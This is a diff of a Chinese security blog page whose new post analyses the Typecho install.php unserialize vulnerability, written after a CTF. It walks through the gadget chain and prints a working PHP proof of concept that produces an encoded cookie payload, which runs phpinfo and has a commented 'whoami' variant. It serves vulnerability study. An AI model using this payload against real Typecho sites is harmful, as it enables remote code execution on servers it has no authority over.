@@ -6,18 +6,23 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="www.xnianq.cn">
-  <title>Hello the word | xnianq&#39;blog</title>
+  <title>typecho前台getshell分析 | xnianq&#39;blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="More code,less talk!! I’am xnianq.  本文出自”xnianq Blog”：www.xnianq.cn/2016/08/04/Hello-the-word/">
+  <meta name="description" content="typecho前台getshell分析省赛题目给的环境是typecho，typecho爆出有前台getshell的漏洞之前是拿过exp打过的，只记得有这么一个洞，导致省赛很捉急，没有外网，不过比赛官方还算良心，在里面放了一个后门，打得还算顺利吧，今天闲的没事，学习一下typecho install.php前台getshell的洞。">
+<meta name="keywords" content="代码审计">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello the word">
-<meta property="og:url" content="www.xnianq.cn/2016/08/04/Hello-the-word/index.html">
+<meta property="og:title" content="typecho前台getshell分析">
+<meta property="og:url" content="www.xnianq.cn/2017/12/09/typecho前台getshell分析/index.html">
 <meta property="og:site_name" content="xnianq&#39;blog">
-<meta property="og:description" content="More code,less talk!! I’am xnianq.  本文出自”xnianq Blog”：www.xnianq.cn/2016/08/04/Hello-the-word/">
-<meta property="og:updated_time" content="2016-11-23T08:16:36.000Z">
+<meta property="og:description" content="typecho前台getshell分析省赛题目给的环境是typecho，typecho爆出有前台getshell的漏洞之前是拿过exp打过的，只记得有这么一个洞，导致省赛很捉急，没有外网，不过比赛官方还算良心，在里面放了一个后门，打得还算顺利吧，今天闲的没事，学习一下typecho install.php前台getshell的洞。">
+<meta property="og:image" content="www.xnianq.cn/2017/12/09/typecho前台getshell分析/%22http://xnianq.cn/2017/12/09/typecho前台getshell分析/漏洞触发.png%22">
+<meta property="og:image" content="www.xnianq.cn/2017/12/09/typecho前台getshell分析/%22http://xnianq.cn/2017/12/09/typecho前台getshell分析/tostring.png%22">
+<meta property="og:image" content="www.xnianq.cn/2017/12/09/typecho前台getshell分析/%22http://xnianq.cn/2017/12/09/typecho前台getshell分析/tostring1.png%22">
+<meta property="og:updated_time" content="2017-12-09T05:19:43.673Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hello the word">
-<meta name="twitter:description" content="More code,less talk!! I’am xnianq.  本文出自”xnianq Blog”：www.xnianq.cn/2016/08/04/Hello-the-word/">
+<meta name="twitter:title" content="typecho前台getshell分析">
+<meta name="twitter:description" content="typecho前台getshell分析省赛题目给的环境是typecho，typecho爆出有前台getshell的漏洞之前是拿过exp打过的，只记得有这么一个洞，导致省赛很捉急，没有外网，不过比赛官方还算良心，在里面放了一个后门，打得还算顺利吧，今天闲的没事，学习一下typecho install.php前台getshell的洞。">
+<meta name="twitter:image" content="www.xnianq.cn/2017/12/09/typecho前台getshell分析/%22http://xnianq.cn/2017/12/09/typecho前台getshell分析/漏洞触发.png%22">
   
     <link rel="alternative" href="/atom.xml" title="xnianq&#39;blog" type="application/atom+xml">
   
@@ -153,30 +158,54 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-Hello-the-word" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="title-typecho前台getshell分析" class="article article-type-title " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      Hello the word
+      typecho前台getshell分析
     </h1>
   
 
         
-        <a href="/2016/08/04/Hello-the-word/" class="archive-article-date">
-  	<time datetime="2016-08-04T13:20:39.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-08-04</time>
+        <a href="/2017/12/09/typecho前台getshell分析/" class="archive-article-date">
+  	<time datetime="2017-12-09T04:10:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-12-09</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="More-code-less-talk"><a href="#More-code-less-talk" class="headerlink" title="More code,less talk!!"></a>More code,less talk!!</h2><hr>
-<p>I’am xnianq.</p>
+        <h1 id="typecho前台getshell分析"><a href="#typecho前台getshell分析" class="headerlink" title="typecho前台getshell分析"></a>typecho前台getshell分析</h1><p>省赛题目给的环境是typecho，typecho爆出有前台getshell的漏洞之前是拿过exp打过的，只记得有这么一个洞，导致省赛很捉急，没有外网，不过比赛官方还算良心，在里面放了一个后门，打得还算顺利吧，今天闲的没事，学习一下typecho install.php前台getshell的洞。<br><a id="more"></a></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>install.php代码中有这么一段代码：<br><img src="&quot;http://xnianq.cn/2017/12/09/typecho前台getshell分析/漏洞触发.png&quot;" alt=""><br>漏洞触发的根本是在调用unserialize反序列化函数产生的。传入”__typecho_config”的cookie值，进行反序列化，对于反序列化的利用必须配合以下魔术方法：<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">__construct</span>(), <span class="variable">__destruct</span>(), <span class="variable">__call</span>(), <span class="variable">__callStatic</span>(), <span class="variable">__get</span>(), <span class="variable">__set</span>(), <span class="variable">__isset</span>(), <span class="variable">__unset</span>(), <span class="variable">__sleep</span>(), <span class="variable">__wakeup</span>(), <span class="variable">__toString</span>(), <span class="variable">__invoke</span>(), <span class="variable">__set_state</span>(), <span class="variable">__clone</span>(), <span class="built_in">and</span> <span class="variable">__autoload</span>().</div></pre></td></tr></table></figure></p>
+<p>在$config[‘adapter’]，如果adapter传入的是一个数组，会调用<strong>toString()方法。于是就查找所有类中哪个</strong>toString方法能够利用。<br><img src="&quot;http://xnianq.cn/2017/12/09/typecho前台getshell分析/tostring.png&quot;" alt=""><br>在Feed.php中发现了可以利用的<strong>toString()函数中，有这么一段代码:<br><img src="&quot;http://xnianq.cn/2017/12/09/typecho前台getshell分析/tostring1.png&quot;" alt=""><br>这里$item[‘author’]会调用</strong>get函数访问内部变量，在request.php中__get()方法：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>调用了get($key)方法：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key, $default = NULL)</span></span></div><div class="line"><span class="function">   </span>&#123;</div><div class="line">       <span class="keyword">switch</span> (<span class="keyword">true</span>) &#123;</div><div class="line">           <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_params[$key]):</div><div class="line">               $value = <span class="keyword">$this</span>-&gt;_params[$key];</div><div class="line">               <span class="keyword">break</span>;</div><div class="line">           <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">self</span>::$_httpParams[$key]):</div><div class="line">               $value = <span class="keyword">self</span>::$_httpParams[$key];</div><div class="line">               <span class="keyword">break</span>;</div><div class="line">           <span class="keyword">default</span>:</div><div class="line">               $value = $default;</div><div class="line">               <span class="keyword">break</span>;</div><div class="line">       &#125;</div><div class="line"></div><div class="line">       $value = !is_array($value) &amp;&amp; strlen($value) &gt; <span class="number">0</span> ? $value : $default;</div><div class="line">       <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_applyFilter($value);</div><div class="line">   &#125;</div></pre></td></tr></table></figure></p>
+<p>继续跟踪，进行了一个过滤，判断，然后传入_applyFilter()函数：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_applyFilter</span><span class="params">($value)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_filter) &#123;</div><div class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_filter <span class="keyword">as</span> $filter) &#123;</div><div class="line">            $value = is_array($value) ? array_map($filter, $value) :</div><div class="line">            call_user_func($filter, $value);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">$this</span>-&gt;_filter = <span class="keyword">array</span>();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> $value;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>终于发现了可以调用函数的地方:<code>call_user_func</code>，其中$filter,$value参数都是我们可控的。现在思路已经明白了：</p>
+<ol>
+<li><p>构造Typecho_Request类，传入call_user_func的两个变量：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>();</div><div class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;_params[<span class="string">'screenName'</span>] = <span class="number">-1</span>;</div><div class="line">        <span class="keyword">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">'phpinfo'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>构造Typecho_Feed类，其中$iterm[‘author’]实例化Typecho_Request类，进而控制传入call_user_func的两个变量：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">const</span> RSS2 = <span class="string">'RSS 2.0'</span>;</div><div class="line">    <span class="comment">/** 定义ATOM 1.0类型 */</span></div><div class="line">    <span class="keyword">const</span> ATOM1 = <span class="string">'ATOM 1.0'</span>;</div><div class="line">    <span class="comment">/** 定义RSS时间格式 */</span></div><div class="line">    <span class="keyword">const</span> DATE_RFC822 = <span class="string">'r'</span>;</div><div class="line">    <span class="comment">/** 定义ATOM时间格式 */</span></div><div class="line">    <span class="keyword">const</span> DATE_W3CDTF = <span class="string">'c'</span>;</div><div class="line">    <span class="comment">/** 定义行结束符 */</span></div><div class="line">    <span class="keyword">const</span> EOL = <span class="string">"\n"</span>;</div><div class="line">    <span class="keyword">private</span> $_type;</div><div class="line">    <span class="keyword">private</span> $_items = <span class="keyword">array</span>();</div><div class="line">    <span class="keyword">public</span> $dateFormat;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;_type = <span class="keyword">self</span>::RSS2;</div><div class="line">        $item[<span class="string">'link'</span>] = <span class="string">'1'</span>;</div><div class="line">        $item[<span class="string">'title'</span>] = <span class="string">'2'</span>;</div><div class="line">        $item[<span class="string">'date'</span>] = <span class="number">1507720298</span>;</div><div class="line">        $item[<span class="string">'author'</span>] = <span class="keyword">new</span> Typecho_Request();</div><div class="line">        <span class="keyword">$this</span>-&gt;_items[<span class="number">0</span>] = $item;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>实例化Typecho_Feed类，传入adapter变量中，进行序列化：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">$x=<span class="keyword">new</span> Typecho_Feed();</div><div class="line">$a=<span class="keyword">array</span>(</div><div class="line"><span class="string">'host'</span> =&gt; <span class="string">'localhost'</span>,</div><div class="line">  <span class="string">'user'</span> =&gt; <span class="string">'root'</span>,</div><div class="line">    <span class="string">'charset'</span> =&gt; <span class="string">'utf8'</span>,</div><div class="line">      <span class="string">'port'</span> =&gt; <span class="string">'3306'</span>,</div><div class="line">        <span class="string">'database'</span> =&gt; <span class="string">'typecho'</span>,</div><div class="line">        <span class="string">'adapter'</span>=&gt;$x,</div><div class="line">        <span class="string">'prefix'</span>=&gt;<span class="string">'typecho_'</span></div><div class="line">    );</div><div class="line"><span class="keyword">echo</span> serialize($a);</div><div class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</div><div class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize($a)));</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>这里还有一个小问题，在install.php中开头调用了ob_start(),此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。这里还是缺乏经验，看lorexxar博客借鉴了一下，学习到了！</p>
+<blockquote>
+<p>这里有两个办法。<br>1、因为call_user_func函数处是一个循环，我们可以通过设置数组来控制第二次执行的函数，然后找一处exit跳出，缓冲区中的数据就会被输出出来。<br>2、第二个办法就是在命令执行之后，想办法造成一个报错，语句报错就会强制停止，这样缓冲区中的数据仍然会被输出出来。</p>
+</blockquote>
+<p>最后PoC构造如下：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span></div><div class="line"><span class="php">&#123;</span></div><div class="line"><span class="php">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span></div><div class="line"><span class="php">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</span></div><div class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></div><div class="line"><span class="php">    &#123;</span></div><div class="line"><span class="php">        <span class="comment">// $this-&gt;_params['screenName'] = 'whoami';</span></span></div><div class="line"><span class="php">        <span class="keyword">$this</span>-&gt;_params[<span class="string">'screenName'</span>] = <span class="number">-1</span>;</span></div><div class="line"><span class="php">        <span class="keyword">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">'phpinfo'</span>;</span></div><div class="line"><span class="php">    &#125;</span></div><div class="line"><span class="php">&#125;</span></div><div class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></span></div><div class="line"><span class="php">&#123;</span></div><div class="line"><span class="php">    <span class="keyword">const</span> RSS2 = <span class="string">'RSS 2.0'</span>;</span></div><div class="line"><span class="php">    <span class="comment">/** 定义ATOM 1.0类型 */</span></span></div><div class="line"><span class="php">    <span class="keyword">const</span> ATOM1 = <span class="string">'ATOM 1.0'</span>;</span></div><div class="line"><span class="php">    <span class="comment">/** 定义RSS时间格式 */</span></span></div><div class="line"><span class="php">    <span class="keyword">const</span> DATE_RFC822 = <span class="string">'r'</span>;</span></div><div class="line"><span class="php">    <span class="comment">/** 定义ATOM时间格式 */</span></span></div><div class="line"><span class="php">    <span class="keyword">const</span> DATE_W3CDTF = <span class="string">'c'</span>;</span></div><div class="line"><span class="php">    <span class="comment">/** 定义行结束符 */</span></span></div><div class="line"><span class="php">    <span class="keyword">const</span> EOL = <span class="string">"\n"</span>;</span></div><div class="line"><span class="php">    <span class="keyword">private</span> $_type;</span></div><div class="line"><span class="php">    <span class="keyword">private</span> $_items = <span class="keyword">array</span>();</span></div><div class="line"><span class="php">    <span class="keyword">public</span> $dateFormat;</span></div><div class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></div><div class="line"><span class="php">    &#123;</span></div><div class="line"><span class="php">        <span class="keyword">$this</span>-&gt;_type = <span class="keyword">self</span>::RSS2;</span></div><div class="line"><span class="php">        $item[<span class="string">'link'</span>] = <span class="string">'1'</span>;</span></div><div class="line"><span class="php">        $item[<span class="string">'title'</span>] = <span class="string">'2'</span>;</span></div><div class="line"><span class="php">        $item[<span class="string">'date'</span>] = <span class="number">1507720298</span>;</span></div><div class="line"><span class="php">        $item[<span class="string">'author'</span>] = <span class="keyword">new</span> Typecho_Request();</span></div><div class="line"><span class="php">        $item[<span class="string">'category'</span>] = <span class="keyword">array</span>(<span class="keyword">new</span> Typecho_Request());</span></div><div class="line"><span class="php">        </span></div><div class="line"><span class="php">        <span class="keyword">$this</span>-&gt;_items[<span class="number">0</span>] = $item;</span></div><div class="line"><span class="php">    &#125;</span></div><div class="line"><span class="php">&#125;</span></div><div class="line"><span class="php">$x = <span class="keyword">new</span> Typecho_Feed();</span></div><div class="line"><span class="php">$a = <span class="keyword">array</span>(</span></div><div class="line"><span class="php">    <span class="string">'host'</span> =&gt; <span class="string">'localhost'</span>,</span></div><div class="line"><span class="php">    <span class="string">'user'</span> =&gt; <span class="string">'xxxxxx'</span>,</span></div><div class="line"><span class="php">    <span class="string">'charset'</span> =&gt; <span class="string">'utf8'</span>,</span></div><div class="line"><span class="php">    <span class="string">'port'</span> =&gt; <span class="string">'3306'</span>,</span></div><div class="line"><span class="php">    <span class="string">'database'</span> =&gt; <span class="string">'typecho'</span>,</span></div><div class="line"><span class="php">    <span class="string">'adapter'</span> =&gt; $x,</span></div><div class="line"><span class="php">    <span class="string">'prefix'</span> =&gt; <span class="string">'typecho_'</span></span></div><div class="line"><span class="php">);</span></div><div class="line"><span class="php"><span class="keyword">echo</span> urlencode(base64_encode(serialize($a)));</span></div><div class="line"><span class="php"><span class="meta">?&gt;</span></span></div></pre></td></tr></table></figure></p>
+<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ol>
+<li><a href="https://lorexxar.cn/2017/10/26/typecho-getshell/" target="_blank" rel="external">https://lorexxar.cn/2017/10/26/typecho-getshell/</a></li>
+<li><a href="http://blog.th3s3v3n.xyz/2017/10/13/web/typecho%E5%90%8E%E9%97%A8%E4%BA%8B%E4%BB%B6%E5%A7%8B%E6%9C%AB/" target="_blank" rel="external">http://blog.th3s3v3n.xyz/2017/10/13/web/typecho%E5%90%8E%E9%97%A8%E4%BA%8B%E4%BB%B6%E5%A7%8B%E6%9C%AB/</a></li>
+</ol>
 <hr>
-<p>本文出自”xnianq Blog”：www.xnianq.cn/2016/08/04/Hello-the-word/</p>
+<p>本文出自”xnianq Blog”：www.xnianq.cn/2017/12/09/typecho前台getshell分析/</p>
 
       
 
@@ -216,6 +245,17 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码审计</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -266,7 +306,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=http:www.xnianq.cn/2016/08/04/Hello-the-word/" alt="微信分享二维码">
+      <img src="http://s.jiathis.com/qrcode.php?url=http:www.xnianq.cn/2017/12/09/typecho前台getshell分析/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -280,15 +320,11 @@
   
 <nav id="article-nav">
   
-    <a href="/2016/08/05/安全之路读书笔记（一）/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          安全之路读书笔记（一）
-        
-      </div>
-    </a>
   
+    <a href="/2017/11/19/l-ctf-simpleblog-wp/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">l-ctf simpleblog wp</div>
+      <i class="icon-circle-right"></i>
+    </a>
   
 </nav>
 
